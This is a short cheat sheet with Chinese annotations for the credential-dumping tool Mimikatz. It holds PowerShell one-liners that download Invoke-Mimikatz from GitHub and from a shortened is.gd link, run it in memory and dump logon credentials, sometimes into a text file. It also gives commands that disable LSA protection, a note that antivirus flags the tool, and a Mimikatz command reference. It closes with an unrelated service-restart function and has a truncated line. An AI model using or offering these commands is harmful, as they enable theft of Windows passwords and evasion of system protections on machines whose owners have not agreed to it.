地址1:
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); 
Invoke-Mimikatz >>c:\1.txt
地址2:
IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); 
Invoke-Mimikatz -DumpCreds

地址3
https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1

powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"



Mimikatz工具:会被杀毒软件当病毒处理

privilege::debug
sekurlsa::logonpasswords

!+
!notifprocess
!notifreg
!sysenvdel /name:Kernel_Lsa_Cfg_Flags /guid:{77fa9abd-0359-4d32-bd60-28f4e78f784b} /attributes:1

cls-----------------------------清屏
exit----------------------------退出
version-------------查看mimikatz的版本
system::user-------查看当前登录的系统用户
system::computer---------查看计算机名称
process::list---------列出进程
process::suspend------暂停进程
process::stop---------结束进程
process::modules--列出系统的核心模块及所在位置
ser

Function Test-Service([String] $serviceName){
	$service=Get-service $serviceName
	$services=@($service)
	#sleep 1
	If($service){
		If('Stopped' -eq $service){
			Start-service $serviceName
			#sleep 1
			$services+=Get-service $serviceName
			Stop-service $serviceName -Force
		}Else{
			Stop-service $serviceName -Force
			#sleep 1
			$services+=Get-service $serviceName
			Start-service $serviceName
		}
		#sleep 1
		$services+=Get-service $serviceName
	}
	$services
}